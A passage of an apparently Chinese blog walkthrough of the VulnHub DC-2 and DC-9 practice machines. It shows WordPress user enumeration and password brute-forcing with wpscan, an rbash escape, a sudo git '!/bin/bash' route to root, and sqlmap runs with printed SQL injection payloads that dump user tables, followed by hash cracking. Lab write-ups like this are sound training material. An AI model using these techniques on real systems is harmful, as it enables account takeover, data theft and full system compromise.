class="line">nibh</span><br><span class="line">tellus</span><br><span class="line">auctor</span><br><span class="line">nisl</span><br><span class="line">sagittis</span><br><span class="line">Suspendisse</span><br><span class="line">laoreet</span><br><span class="line">fermentum</span><br><span class="line">Our</span><br><span class="line">metus</span><br><span class="line">eros</span><br><span class="line">cursus</span><br><span class="line">dignissim</span><br><span class="line">Pellentesque</span><br><span class="line">tortor</span><br><span class="line">lacus</span><br><span class="line">consectetur</span><br><span class="line">convallis</span><br><span class="line">velit</span><br><span class="line">malesuada</span><br><span class="line">Proin</span><br><span class="line">rhoncus</span><br><span class="line">mauris</span><br><span class="line">placerat</span><br><span class="line">commodo</span><br><span class="line">enim</span><br><span class="line">dolor</span><br><span class="line">augue</span><br><span class="line">purus</span><br><span class="line">maximus</span><br><span class="line">posuere</span><br><span class="line">iaculis</span><br><span class="line">molestie</span><br><span class="line">WordPress</span><br><span class="line">Integer</span><br><span class="line">felis</span><br><span class="line">lobortis</span><br><span class="line">condimentum</span><br><span class="line">Nullam</span><br><span class="line">risus</span><br><span class="line">nunc</span><br><span class="line">porttitor</span><br><span class="line">lacinia</span><br><span class="line">imperdiet</span><br><span class="line">porta</span><br><span class="line">viverra</span><br><span class="line">Curabitur</span><br><span class="line">hendrerit</span><br><span class="line">dapibus</span><br><span class="line">diam</span><br><span class="line">branding</span><br><span class="line">header</span><br><span class="line">navigation</span><br><span class="line">entry</span><br><span class="line">aliquam</span><br><span class="line">ullamcorper</span><br><span class="line">Nam</span><br><span class="line">varius</span><br><span class="line">feugiat</span><br><span class="line">ultrices</span><br><span class="line">ligula</span><br><span class="line">scelerisque</span><br><span class="line">congue</span><br><span class="line">gravida</span><br><span class="line">Feed</span><br><span class="line">Mauris</span><br><span class="line">vulputate</span><br><span class="line">semper</span><br><span class="line">elit</span><br><span class="line">tristique</span><br><span class="line">Maecenas</span><br><span class="line">lorem</span><br><span class="line">sollicitudin</span><br><span class="line">Cras</span><br><span class="line">bibendum</span><br><span class="line">Praesent</span><br><span class="line">libero</span><br><span class="line">vehicula</span><br><span class="line">euismod</span><br><span class="line">ultricies</span><br><span class="line">ornare</span><br><span class="line">lectus</span><br><span class="line">Flag</span><br><span class="line">rutrum</span><br><span class="line">fringilla</span><br><span class="line">Morbi</span><br><span class="line">Aliquam</span><br><span class="line">Quisque</span><br><span class="line">primis</span><br><span class="line">magna</span><br><span class="line">pulvinar</span><br><span class="line">Phasellus</span><br><span class="line">tempus</span><br><span class="line">eleifend</span><br><span class="line">elementum</span><br><span class="line">another</span><br><span class="line">What</span><br><span class="line">People</span><br><span class="line">Products</span><br><span class="line">est</span><br><span class="line">accumsan</span><br><span class="line">venenatis</span><br><span class="line">Etiam</span><br><span class="line">pharetra</span><br><span class="line">Fusce</span><br><span class="line">efficitur</span><br><span class="line">Just</span><br><span class="line">Welcome</span><br><span class="line">Nunc</span><br><span class="line">massa</span><br><span class="line">pellentesque</span><br><span class="line">Duis</span><br><span class="line">Nulla</span><br><span class="line">cubilia</span><br><span class="line">Curae</span><br><span class="line">Vivamus</span><br><span class="line">fames</span><br><span class="line">facilisis</span><br><span class="line">consequat</span><br><span class="line">Skip</span><br><span class="line">text</span><br><span class="line">custom</span><br><span class="line">Menu</span><br><span class="line">top</span><br><span class="line">masthead</span><br><span class="line">pretium</span><br><span class="line">potenti</span><br><span class="line">post</span><br><span class="line">main</span><br><span class="line">primary</span><br><span class="line">Proudly</span><br><span class="line">powered</span><br><span class="line">info</span><br><span class="line">colophon</span><br><span class="line">contain</span><br><span class="line">page</span><br><span class="line">Comments</span><br><span class="line">RSD</span><br><span class="line">mollis</span><br><span class="line">mattis</span><br><span class="line">habitant</span><br><span class="line">morbi</span><br><span class="line">senectus</span><br><span class="line">netus</span><br><span class="line">aliquet</span><br><span class="line">tempor</span><br><span class="line">you</span><br><span class="line">Interdum</span><br><span class="line">just</span><br><span class="line">can</span><br><span class="line">Scroll</span><br><span class="line">down</span><br><span class="line">Lorem</span><br><span class="line">adipiscing</span><br><span class="line">panel</span><br><span class="line">facilisi</span><br><span class="line">Orci</span><br><span class="line">natoque</span><br><span class="line">penatibus</span><br><span class="line">magnis</span><br><span class="line">dis</span><br><span class="line">parturient</span><br><span class="line">montes</span><br><span class="line">nascetur</span><br><span class="line">ridiculus</span><br><span class="line">mus</span><br><span class="line">Your</span><br><span class="line">usual</span><br><span class="line">wordlists</span><br><span class="line">probably</span><br><span class="line">won</span><br><span class="line">work</span><br><span class="line">instead</span><br><span class="line">maybe</span><br><span class="line">need</span><br><span class="line">cewl</span><br><span class="line">More</span><br><span class="line">passwords</span><br><span class="line">always</span><br><span class="line">better</span><br><span class="line">but</span><br><span class="line">sometimes</span><br><span class="line">win</span><br><span class="line">them</span><br><span class="line">all</span><br><span class="line">Log</span><br><span class="line">one</span><br><span class="line">see</span><br><span class="line">the</span><br><span class="line">next</span><br><span class="line">flag</span><br><span class="line">find</span><br><span class="line">log</span><br></pre></td></tr></table></figure>
+
+<p>再來可以用wpscan掃網站，因為他是wordpress的</p>
+<p><code>wpscan --url dc-2 --enumerate u</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="line"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;============================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">**[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)**</span><br><span class="line"></span><br><span class="line">**[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)**</span><br></pre></td></tr></table></figure>
+
+<p>將這些用戶寫成user.txt再丟一次爆破</p>
+<p><code>wpscan --url dc-2 user.txt -P passwd_dict.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="line"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;===========================================================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;============================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">**[SUCCESS] - jerry / adipiscing                                                                                                                            </span><br><span class="line">[SUCCESS] - tom / parturient**                                                                                                                              </span><br><span class="line">Trying admin / log Time: 00:00:25 &lt;===============================================                                    &gt; (646 / 1121) 57.62%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+
+<p><strong>[SUCCESS] - jerry &#x2F; adipiscing<br>[SUCCESS] - tom &#x2F; parturient</strong>  </p>
+<p>嘗試用這些用戶去找admin密碼</p>
+<p><a target="_blank" rel="noopener" href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
+<p>jerry</p>
+<p><img src="/img/DC_Untitled_35.png" alt="Untitled"></p>
+<p><img src="/img/DC_Untitled_36.png" alt="Untitled"></p>
+<p>找到了flag2</p>
+<p><img src="/img/DC_Untitled_37.png" alt="Untitled"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
+
+<p>再查看了Tom的後台，並沒有發現任何東西</p>
+<p>先前有個7744 port開啟，也許能去看看ssh</p>
+<p><code>ssh [tom@192.168.147.133](mailto:tom@192.168.147.133) -p 7744</code></p>
+<p><img src="/img/DC_Untitled_38.png" alt="Untitled"></p>
+<p>flag3 這裡無法用cat，但vi能開啟檔案</p>
+<p><img src="/img/DC_Untitled_39.png" alt="Untitled"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+
+<p>還有一種方式能查看flag3</p>
+<p>需要绕过rbash（受限的bash）</p>
+<p>**<code>BASH_CMDS</code>**是 Bash 中的一個關聯數組，用於存儲命令歷史記錄及其相應的命令行</p>
+<p><img src="/img/DC_Untitled_40.png" alt="Untitled"></p>
+<p>另一種繞過rbash方式</p>
+<p><img src="/img/DC_Untitled_41.png" alt="Untitled"></p>
+<p>直接再tom用戶下su jerry登入</p>
+<p><img src="/img/DC_Untitled_42.png" alt="Untitled"></p>
+<p>預設再tom底下，需要切換目錄到jerry</p>
+<p><img src="/img/DC_Untitled_43.png" alt="Untitled"></p>
+<p>sudo -l可以知道當下可以用sudo執行的命令</p>
+<p>看下來應該是跟git提權相關</p>
+<ul>
+<li><p>git提權補充</p>
+<p>  git -p help &#x3D;&#x3D; man git</p>
+<p>  所以兩者串起來用 sudo 叫起來的 git會去執行 man 而 man 支援 !</p>
+<p>  就等於用 sudo 可以執行任意指令</p>
+</li>
+</ul>
+<p><img src="/img/DC_Untitled_44.png" alt="Untitled"></p>
+<p><code>sudo /usr/bin/git help config</code> 輸入後再最後一行打上!&#x2F;bin&#x2F;bash</p>
+<p><img src="/img/DC_Untitled_45.png" alt="Untitled"></p>
+<p>切換到root目錄下完事</p>
+<p><img src="/img/DC_Untitled_46.png" alt="Untitled"></p>
+<hr>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a></p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-9.zip"></a></p>
+<p>已知該機器的MAC 00:0C:29:FE:8B:07</p>
+<p><img src="/img/DC_Untitled_47.png" alt="Untitled"></p>
+<p>因為是橋接，所以機器的網段應該會一樣 </p>
+<p>kali : 192.168.147.128   NAT</p>
+<p>dc-9 : MAC 00:0C:29:FE:8B:07  NAT</p>
+<p>需要用<code>netdiscover</code>去掃192.168.0.0&#x2F;24的位置看有沒有符合該網段資訊的IP</p>
+<p>或是可以用<code>namp -sn 192.168.0.0/24</code></p>
+<p>這裡用 <code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
+<p><img src="/img/DC_Untitled_48.png" alt="Untitled"></p>
+<p>找到了192.168.147.131的IP位址</p>
+<p><code>nmap -sV -p- -O -T4 192.168.147.131</code></p>
+<ul>
+<li><code>-sV</code> 確定服務&#x2F;版本信息</li>
+<li><code>-T4</code> 為了更快的執行</li>
+<li><code>-p-</code> 掃描所有端口</li>
+<li><code>-O</code> 識別操作系統</li>
+</ul>
+<p><img src="/img/DC_Untitled_49.png" alt="Untitled"></p>
+<p>查看開放的服務後沒發現可利用的內容</p>
+<p>22 port filtered</p>
+<p>一般nmap所掃描出來的結果有三種：<code>open、filtered、unfiltered</code></p>
+<ul>
+<li>Open意思是指目標機器的這個連接埠有開啟</li>
+<li>Filtered意思是指有Firewall&#x2F;filter,或是其它的網路設備將掩蓋了此連接埠，並且阻止nmap去得知連接埠是否有開啟</li>
+<li>Unfiltered意思是指這個連接埠被nmap判定為關閉的，並且沒有任何Firewall&#x2F;filter來阻止nmap來嘗試得知連接埠的狀態。Unfiltered ports是很平常的訊息，並且只出現在大部份的掃描連接埠在filtered狀態中。</li>
+</ul>
+<p>猜他使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking</a> 的方法</p>
+<p>查看該網站功能</p>
+<p><img src="/img/DC_Untitled_50.png" alt="Untitled"></p>
+<p>再搜索位址下使用SQL injection可以允許執行，不過需要繞一下</p>
+<p><img src="/img/DC_Untitled_51.png" alt="Untitled"></p>
+<p>用sqlmap去爆破，首先複製全Request成一個txt檔案(Copy to file)</p>
+<p><img src="/img/DC_Untitled_52.png" alt="Untitled"></p>
+<p><code>sqlmap -r search.txt --dbs</code></p>
+<p><img src="/img/DC_Untitled_53.png" alt="Untitled"></p>
+<p>有一些存在的DB</p>
+<p>available databases [3]:<br>[<em>]  <em>information_schema</em><br>[</em>]  Staff<br>[*]  users</p>
+<p>再來找<strong>tables</strong></p>
+<p><code>sqlmap -r search.txt --tables</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="keyword">Parameter</span>: <span class="keyword">search</span> (POST)</span><br><span class="line">    Type: <span class="type">time</span><span class="operator">-</span>based blind</span><br><span class="line">    Title: MySQL <span class="operator">&gt;=</span> <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="type">time</span><span class="operator">-</span>based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; AND (SELECT 3355 FROM (SELECT(SLEEP(5)))Rcyx) AND &#x27;</span>nyOI<span class="string">&#x27;=&#x27;</span>nyOI</span><br><span class="line"></span><br><span class="line">    Type: <span class="keyword">UNION</span> query</span><br><span class="line">    Title: Generic <span class="keyword">UNION</span> query (<span class="keyword">NULL</span>) <span class="operator">-</span> <span class="number">6</span> columns</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a707871,0x5067686578705049616e6f687a72434e7769564250617772595941474a4d6e614c4a4c72417a4556,0x7176707a71),NULL,NULL,NULL,NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 10 (buster)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.38</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching tables for databases: &#x27;</span>Staff, information_schema, users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: information_schema</span></span><br><span class="line"><span class="string">[76 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| ALL_PLUGINS                           |</span></span><br><span class="line"><span class="string">| APPLICABLE_ROLES                      |</span></span><br><span class="line"><span class="string">| CHARACTER_SETS                        |</span></span><br><span class="line"><span class="string">| CHECK_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| CLIENT_STATISTICS                     |</span></span><br><span class="line"><span class="string">| COLLATIONS                            |</span></span><br><span class="line"><span class="string">| COLLATION_CHARACTER_SET_APPLICABILITY |</span></span><br><span class="line"><span class="string">| COLUMNS                               |</span></span><br><span class="line"><span class="string">| COLUMN_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| ENABLED_ROLES                         |</span></span><br><span class="line"><span class="string">| ENGINES                               |</span></span><br><span class="line"><span class="string">| EVENTS                                |</span></span><br><span class="line"><span class="string">| FILES                                 |</span></span><br><span class="line"><span class="string">| GEOMETRY_COLUMNS                      |</span></span><br><span class="line"><span class="string">| GLOBAL_STATUS                         |</span></span><br><span class="line"><span class="string">| GLOBAL_VARIABLES                      |</span></span><br><span class="line"><span class="string">| INDEX_STATISTICS                      |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE                    |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE_LRU                |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_POOL_STATS              |</span></span><br><span class="line"><span class="string">| INNODB_CMP                            |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM                         |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM_RESET                   |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX                  |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX_RESET            |</span></span><br><span class="line"><span class="string">| INNODB_CMP_RESET                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_BEING_DELETED               |</span></span><br><span class="line"><span class="string">| INNODB_FT_CONFIG                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_DEFAULT_STOPWORD            |</span></span><br><span class="line"><span class="string">| INNODB_FT_DELETED                     |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_CACHE                 |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_TABLE                 |</span></span><br><span class="line"><span class="string">| INNODB_LOCKS                          |</span></span><br><span class="line"><span class="string">| INNODB_LOCK_WAITS                     |</span></span><br><span class="line"><span class="string">| INNODB_METRICS                        |</span></span><br><span class="line"><span class="string">| INNODB_MUTEXES                        |</span></span><br><span class="line"><span class="string">| INNODB_SYS_COLUMNS                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_DATAFILES                  |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FIELDS                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN_COLS               |</span></span><br><span class="line"><span class="string">| INNODB_SYS_INDEXES                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_SEMAPHORE_WAITS            |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLES                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESPACES                |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESTATS                 |</span></span><br><span class="line"><span class="string">| INNODB_SYS_VIRTUAL                    |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_ENCRYPTION         |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_SCRUBBING          |</span></span><br><span class="line"><span class="string">| INNODB_TRX                            |</span></span><br><span class="line"><span class="string">| KEY_CACHES                            |</span></span><br><span class="line"><span class="string">| KEY_COLUMN_USAGE                      |</span></span><br><span class="line"><span class="string">| PARAMETERS                            |</span></span><br><span class="line"><span class="string">| PARTITIONS                            |</span></span><br><span class="line"><span class="string">| PLUGINS                               |</span></span><br><span class="line"><span class="string">| PROCESSLIST                           |</span></span><br><span class="line"><span class="string">| PROFILING                             |</span></span><br><span class="line"><span class="string">| REFERENTIAL_CONSTRAINTS               |</span></span><br><span class="line"><span class="string">| ROUTINES                              |</span></span><br><span class="line"><span class="string">| SCHEMATA                              |</span></span><br><span class="line"><span class="string">| SCHEMA_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| SESSION_STATUS                        |</span></span><br><span class="line"><span class="string">| SESSION_VARIABLES                     |</span></span><br><span class="line"><span class="string">| SPATIAL_REF_SYS                       |</span></span><br><span class="line"><span class="string">| STATISTICS                            |</span></span><br><span class="line"><span class="string">| SYSTEM_VARIABLES                      |</span></span><br><span class="line"><span class="string">| TABLES                                |</span></span><br><span class="line"><span class="string">| TABLESPACES                           |</span></span><br><span class="line"><span class="string">| TABLE_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| TABLE_PRIVILEGES                      |</span></span><br><span class="line"><span class="string">| TABLE_STATISTICS                      |</span></span><br><span class="line"><span class="string">| TRIGGERS                              |</span></span><br><span class="line"><span class="string">| USER_PRIVILEGES                       |</span></span><br><span class="line"><span class="string">| USER_STATISTICS                       |</span></span><br><span class="line"><span class="string">| VIEWS                                 |</span></span><br><span class="line"><span class="string">| user_variables                        |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| StaffDetails                          |</span></span><br><span class="line"><span class="string">| Users                                 |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">[1 table]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| UserDetails                           |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>提取表的每一列(<code>Staff</code>、users)</p>
+<p><code>sqlmap -r search_form.txt --columns -D Staff</code></p>
+<p><img src="/img/DC_Untitled_54.png" alt="Untitled"></p>
+<p><code>sqlmap -r search.txt --columns -D users</code></p>
+<p><img src="/img/DC_Untitled_55.png" alt="Untitled"></p>
+<p>接下來轉儲tables的中的數據</p>
+<p><code>sqlmap -r search.txt --dump -D users -T UserDetails</code></p>
+<p><img src="/img/DC_Untitled_56.png" alt="Untitled"></p>
+<p><code>sqlmap -r search.txt --dump -D Staff -T Users</code></p>
+<p><img src="/img/DC_Untitled_57.png" alt="Untitled"></p>
+<p>這裡就找到了admin Password，它包含一個明文用戶名和一個<a target="_blank" rel="noopener" href="https://auth0.com/blog/hashing-passwords-one-way-road-to-security/">散列密碼</a>，甚至 sqlmap 也將其識別為 MD5。</p>
+<p><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>破解這個哈希值</p>
+<p><img src="/img/DC_Untitled_58.png" alt="Untitled"></p>
+<p>transorbital1</p>
+<p><img src="/img/DC_Untitled_59.png" alt="Untitled"></p>
